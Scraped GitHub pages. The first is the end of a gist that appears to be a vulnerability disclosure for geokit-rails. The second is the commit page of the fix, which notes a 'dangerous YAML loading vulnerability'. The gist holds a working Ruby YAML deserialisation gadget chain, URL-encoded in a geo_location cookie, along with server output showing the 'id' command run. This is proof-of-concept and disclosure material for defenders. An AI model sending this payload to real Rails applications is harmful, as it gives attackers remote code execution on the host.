Cookie: geo_location=---%0A-+%21ruby%2Fobject%3AGem%3A%3AInstaller%0A++++i%3A+x%0A-+%21ruby%2Fobject%3AGem%3A%3ASpecFetcher%0A++++i%3A+y%0A-+%21ruby%2Fobject%3AGem%3A%3ARequirement%0A++requirements%3A%0A++++%21ruby%2Fobject%3AGem%3A%3APackage%3A%3ATarReader%0A++++io%3A+%261+%21ruby%2Fobject%3ANet%3A%3ABufferedIO%0A++++++io%3A+%261+%21ruby%2Fobject%3AGem%3A%3APackage%3A%3ATarReader%3A%3AEntry%0A+++++++++read%3A+0%0A+++++++++header%3A+%22abc%22%0A++++++debug_output%3A+%261+%21ruby%2Fobject%3ANet%3A%3AWriteAdapter%0A+++++++++socket%3A+%261+%21ruby%2Fobject%3AGem%3A%3ARequestSet%0A+++++++++++++sets%3A+%21ruby%2Fobject%3ANet%3A%3AWriteAdapter%0A+++++++++++++++++socket%3A+%21ruby%2Fmodule+%27Kernel%27%0A+++++++++++++++++method_id%3A+%3Asystem%0A+++++++++++++git_set%3A+id%0A+++++++++method_id%3A+%3Aresolve; _my_rails_app_session=%2B48ny21MkgVzlJR4LMcsdNtOK0G1aHx0%2Byoz4xLnkaMHrCner7YSRfQ04notQ0oNesQdG4EV5T%2FpyrQBSKBdKOZLLvP2J1NLOAQe1Z5zTTuu5Grcw1wuRpIHKAmZjfj3bqKqghkOj1JpOBxJoxFS7L6cH3wIsoq%2FrK%2BlAxVvP%2F8F9g5Q%2FA3pLVj2DTF3l7CcDBzOE9cPCOShesP717YbZNoa%2BPNf3mGjmKWvq26Y3CKMg2z7mAJHA%2B0CdA9l2pXsbrgwRJUW3Epqx4eJt0%2FDCJgS6Mp7rGjQeoIqLj4%3D--YAEA%2FepI0t701ifo--fVitYcX5PORz3a9xN4ev4A%3D%3D; __profilin=p%3Dt
```

The server stack trace shows that the payload was deserialised and the arbitrary command (id) was executed when the request was processed:

```
Processing by VulnsController#index as HTML
sh: reading: command not found
uid=501(calumh) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
Completed 500 Internal Server Error in 167ms (Allocations: 35610)

```

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2Fb7aa1c2e71c8d4386463ac14f686901d)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_0c42d0b7_20250111_155818.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeokit%2Fgeokit-rails%2Fcommit%2Fa93dfe49fb9aeae7164e2f8c4041450a04b5482f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeokit%2Fgeokit-rails%2Fcommit%2Fa93dfe49fb9aeae7164e2f8c4041450a04b5482f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=geokit%2Fgeokit-rails)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[geokit](/geokit)
/
**[geokit-rails](/geokit/geokit-rails)**
Public

* [Notifications](/login?return_to=%2Fgeokit%2Fgeokit-rails) You must be signed in to change notification settings
* [Fork
  245](/login?return_to=%2Fgeokit%2Fgeokit-rails)
* [Star
   1.6k](/login?return_to=%2Fgeokit%2Fgeokit-rails)

* [Code](/geokit/geokit-rails)
* [Issues
  34](/geokit/geokit-rails/issues)
* [Pull requests
  4](/geokit/geokit-rails/pulls)
* [Actions](/geokit/geokit-rails/actions)
* [Projects
  0](/geokit/geokit-rails/projects)
* [Wiki](/geokit/geokit-rails/wiki)
* [Security](/geokit/geokit-rails/security)
* [Insights](/geokit/geokit-rails/pulse)

Additional navigation options

* [Code](/geokit/geokit-rails)
* [Issues](/geokit/geokit-rails/issues)
* [Pull requests](/geokit/geokit-rails/pulls)
* [Actions](/geokit/geokit-rails/actions)
* [Projects](/geokit/geokit-rails/projects)
* [Wiki](/geokit/geokit-rails/wiki)
* [Security](/geokit/geokit-rails/security)
* [Insights](/geokit/geokit-rails/pulse)

## Commit

[Permalink](/geokit/geokit-rails/commit/a93dfe49fb9aeae7164e2f8c4041450a04b5482f)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Re-enabled and fixed up tests and removed YAML support.

[Browse files](/geokit/geokit-rails/tree/a93dfe49fb9aeae7164e2f8c4041450a04b5482f)
Browse the repository at this point in the history

* Loading branch information

ryankopf
committed
Jan 21, 2023

1 parent
[3a84bd9](/geokit/geokit-rails/commit/3a84bd9729f689ac459e9ca3f3ced1b3ebfc490c)

commit a93dfe4

Showing
**1 changed file**
with
**5 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

5 changes: 5 additions & 0 deletions

5
[CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed "CHANGELOG.md")

Show comments

[View file](/geokit/geokit-rails/blob/a93dfe49fb9aeae7164e2f8c4041450a04b5482f/CHANGELOG.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,3 +1,8 @@ |
|  |  | ## 2.5.0 |
|  |  |  |
|  |  | \* Fixed dangerous YAML loading vulnerability |
|  |  | \* Rebuilt integration tests |
|  |  |  |
|  |  | ## 2.3.2 |
|  |  |  |
|  |  | \* Fix sqlite3 adapter error |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `a93dfe4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeokit%2Fgeokit-rails%2Fcommit%2Fa93dfe49fb9aeae7164e2f8c4041450a04b5482f) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


